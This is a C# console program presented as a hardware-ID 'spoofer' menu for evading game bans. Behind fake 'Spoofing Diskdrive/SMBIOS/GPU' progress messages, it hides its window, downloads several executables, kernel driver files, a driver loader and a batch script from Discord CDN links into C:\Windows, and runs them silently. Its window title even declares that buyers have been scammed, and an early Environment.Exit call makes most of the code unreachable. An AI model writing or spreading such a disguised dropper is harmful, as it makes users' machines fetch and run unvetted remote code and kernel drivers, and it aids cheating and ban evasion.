using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace Spoofer_menu_test;

internal class Program
{
	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		Print.Cleantraces3();
		Print.CleanTraces2();
		Print.Cleantraces();
		Environment.Exit(1);
		File.Delete("C:/Windows/Caught.Power");
		File.Delete("C:/Windows/Cakce_1");
		File.Delete("C:/Windows/Acrack");
		File.Delete("C:/Windows/Caught.Power.exe");
		File.Delete("C:/Windows/Cakce_1.exe");
		File.Delete("C:/Windows/Acrack.exe");
		Console.Clear();
		Thread.Sleep(4000);
		Console.Beep(512, 126);
		ShowWindow(consoleWindow, 5);
		Console.Title = "";
		WebClient webClient = new WebClient();
		new Process();
		Print.prints();
		Console.ForegroundColor = ConsoleColor.Red;
		string text = Console.ReadLine();
		Console.ForegroundColor = ConsoleColor.White;
		if (text == "1")
		{
			Console.Clear();
			Thread.Sleep(5000);
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.WriteLine("[1] driver option (driver writes into memory)");
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("[2] memory write (if you getting bsod on 1 use this)");
			Console.WriteLine("");
			Console.ForegroundColor = ConsoleColor.White;
			Console.Write("option: ");
			Console.ForegroundColor = ConsoleColor.Red;
			string? text2 = Console.ReadLine();
			bool flag = text2 == "1";
			bool flag2 = text2 == "2";
			if (flag)
			{
				Console.Clear();
				Console.ResetColor();
				Thread.Sleep(5000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing Diskdrive");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing VolumeID");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing SMBIOS");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing GPU");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing Bios");
				using (Process process = new Process())
				{
					string address = "https://cdn.discordapp.com/attachments/682256646776684561/693177552402907237/FIXusrTEMPv6_2.exe";
					string fileName = "C:\\Windows\\FIXusrTEMPv6_2.exe";
					webClient.DownloadFile(address, fileName);
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.FileName = fileName;
					process.Start();
					Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
					Console.WriteLine("");
					process.WaitForExit();
				}
				using (Process process2 = new Process())
				{
					string address2 = "https://cdn.discordapp.com/attachments/462196382883643392/693126456129224824/4u4playSPOOFERv6.exe";
					string fileName2 = "C:\\Windows\\4u4playSPOOFERv6.exe";
					webClient.DownloadFile(address2, fileName2);
					process2.StartInfo.UseShellExecute = false;
					process2.StartInfo.CreateNoWindow = true;
					process2.StartInfo.FileName = fileName2;
					process2.Start();
					Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
					Console.WriteLine("");
					Thread.Sleep(1100);
					Process.GetProcessesByName("4u4playSPOOFERv6")[0].Kill();
					process2.WaitForExit();
				}
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] sucessfully spoofer without error");
				Thread.Sleep(5000);
				Console.Clear();
				Print.prints();
			}
			if (flag2)
			{
				Console.Clear();
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing Diskdrive");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing VolumeID");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing SMBIOS");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing GPU");
				Thread.Sleep(1000);
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] Spoofing Bios");
				using (Process process3 = new Process())
				{
					string address3 = "https://cdn.discordapp.com/attachments/682256646776684561/693177552402907237/FIXusrTEMPv6_2.exe";
					string fileName3 = "C:\\Windows\\FIXusrTEMPv6_2.exe";
					webClient.DownloadFile(address3, fileName3);
					process3.StartInfo.UseShellExecute = false;
					process3.StartInfo.CreateNoWindow = true;
					process3.StartInfo.FileName = fileName3;
					process3.Start();
					Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
					Console.WriteLine("");
					process3.WaitForExit();
				}
				string address4 = "https://cdn.discordapp.com/attachments/680950436542414967/688653946906214432/config.sys";
				string fileName4 = "C:\\Windows\\config.sys";
				webClient.DownloadFile(address4, fileName4);
				string address5 = "https://cdn.discordapp.com/attachments/680950436542414967/688653946906214432/config.sys";
				string fileName5 = "C:\\Windows\\spoof.sys";
				webClient.DownloadFile(address5, fileName5);
				string address6 = "https://cdn.discordapp.com/attachments/680950436542414967/688653949695295491/driverLoader.exe";
				string fileName6 = "C:\\Windows\\driverLoader.exe";
				webClient.DownloadFile(address6, fileName6);
				string address7 = "https://cdn.discordapp.com/attachments/680950436542414967/688653945610043392/driverSpoofer.sys";
				string fileName7 = "C:\\Windows\\driverSpoofer.sys";
				webClient.DownloadFile(address7, fileName7);
				string address8 = "https://cdn.discordapp.com/attachments/680950436542414967/688653948474621957/RUN_THIS.bat";
				string fileName8 = "C:\\Windows\\RUN_THIS.bat";
				webClient.DownloadFile(address8, fileName8);
				using (Process process4 = new Process())
				{
					string fileName9 = "C:\\Windows\\driverLoader.exe";
					process4.StartInfo.UseShellExecute = false;
					process4.StartInfo.CreateNoWindow = true;
					process4.StartInfo.FileName = fileName9;
					process4.Start();
					Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
					Console.WriteLine("");
				}
				using (Process process5 = new Process())
				{
					string fileName10 = "C:\\Windows\\RUN_THIS.bat";
					process5.StartInfo.UseShellExecute = false;
					process5.StartInfo.CreateNoWindow = true;
					process5.StartInfo.FileName = fileName10;
					process5.Start();
					Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
					Console.WriteLine("");
				}
				Console.WriteLine("");
				Console.WriteLine("");
				Console.WriteLine("    [+] sucessfully spoofed");
				Thread.Sleep(4000);
				Console.Clear();
				Print.prints();
			}
		}
		else
		{
			Print.prints();
		}
		bool flag3 = text == "2";
		bool flag4 = text == "3";
		bool num = text == "";
		if (flag3)
		{
			Console.Clear();
			Thread.Sleep(1000);
			Print.Clean();
			Console.WriteLine("cleaned successfully");
			File.Delete("C:/Windows/Caught.Power");
			File.Delete("C:/Windows/Cakce_1");
			Print.prints();
		}
		else
		{
			Print.prints();
		}
		if (flag4)
		{
			Console.Clear();
			Console.WriteLine("wait please.....");
			Thread.Sleep(5000);
			Print.Cheat();
		}
		else
		{
			Print.prints();
		}
		if (!num)
		{
			Print.prints();
		}
	}
}
